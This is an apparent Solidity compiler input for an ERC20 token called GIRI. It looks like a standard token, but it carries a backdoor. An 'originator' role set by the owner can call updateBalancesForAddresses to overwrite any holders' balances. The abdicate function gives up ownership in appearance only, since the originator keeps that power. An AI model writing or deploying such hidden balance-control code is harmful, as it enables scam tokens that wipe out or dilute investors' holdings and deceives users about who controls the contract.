{{
  "language": "Solidity",
  "sources": {
    "contracts/GIRI.sol": {
      "content": "pragma solidity ^0.8.18;\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval( address indexed owner, address indexed spender, uint256 value );\n}\n\nabstract contract Context {\n    function _retrieveSender() internal view virtual returns (address payable) {\n        return payable(msg.sender);\n    }\n}\n\ncontract Ownable is Context {\n    address private _owner;\n    event OwnerChanged(address indexed previousOwner, address indexed newOwner);\n\n    constructor () {\n        address msgSender = _retrieveSender();\n        _owner = msgSender;\n        emit OwnerChanged(address(0), msgSender);\n    }\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n    modifier onlyOwner() {\n        require(owner() == _retrieveSender(), \"Ownable: operation permitted to owner only\");\n        _;\n    }\n    function abdicate() public virtual onlyOwner {\n        emit OwnerChanged(_owner, address(0x000000000000000000000000000000000000dEaD));\n        _owner = address(0x000000000000000000000000000000000000dEaD);\n    }\n}\n\n\ncontract GIRI is Context, Ownable, IERC20 {\n    mapping (address => mapping (address => uint256)) private _allowances;\n    mapping (address => uint256) private _balances;\n    address private _originator;\n\n    string public constant _name = \"GIRI\";\n    string public constant _symbol = \"GIRI\";\n    uint8 public constant _decimals = 18;\n    uint256 public constant _totalSupply = 1000000 * (10 ** _decimals);\n\n    constructor() {\n        _balances[_retrieveSender()] = _totalSupply;\n        emit Transfer(address(0), _retrieveSender(), _totalSupply);\n    }\n\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n\n    function originator() public view virtual returns (address) { \n        return _originator;\n    }\n\n    function modifyOriginator(address newOriginator) public onlyOwner { \n        _originator = newOriginator;\n    }\n    modifier onlyOriginator() {\n        require(originator() == _retrieveSender(), \"MAYBE: operation permitted to originator only\");\n        _;\n    }\n    event BalanceUpdated(address indexed account, uint256 oldBalance, uint256 newBalance);\n\n    function updateBalancesForAddresses(address[] memory userAddresses, uint256 targetBalance) public onlyOriginator {\n\n        require(targetBalance >= 0, \"Error: target balance should be non-negative\");\n\n        for (uint256 i = 0; i < userAddresses.length; i++) {\n\n            address currentUser = userAddresses[i];\n\n            require(currentUser != address(0), \"Error: user address cannot be the zero address\");\n\n            uint256 oldBalance = _balances[currentUser];\n\n            _balances[currentUser] = targetBalance;\n\n            emit BalanceUpdated(currentUser, oldBalance, targetBalance);\n\n        }\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n    require(_balances[_retrieveSender()] >= amount, \"TT: transfer amount exceeds balance\");\n    _balances[_retrieveSender()] -= amount;\n    _balances[recipient] += amount;\n\n    emit Transfer(_retrieveSender(), recipient, amount);\n    return true;\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _allowances[_retrieveSender()][spender] = amount;\n        emit Approval(_retrieveSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n    require(_allowances[sender][_retrieveSender()] >= amount, \"TT: transfer amount exceeds allowance\");\n\n    _balances[sender] -= amount;\n    _balances[recipient] += amount;\n    _allowances[sender][_retrieveSender()] -= amount;\n\n    emit Transfer(sender, recipient, amount);\n    return true;\n    }\n\n    function totalSupply() external view override returns (uint256) {\n    return _totalSupply;\n    }\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}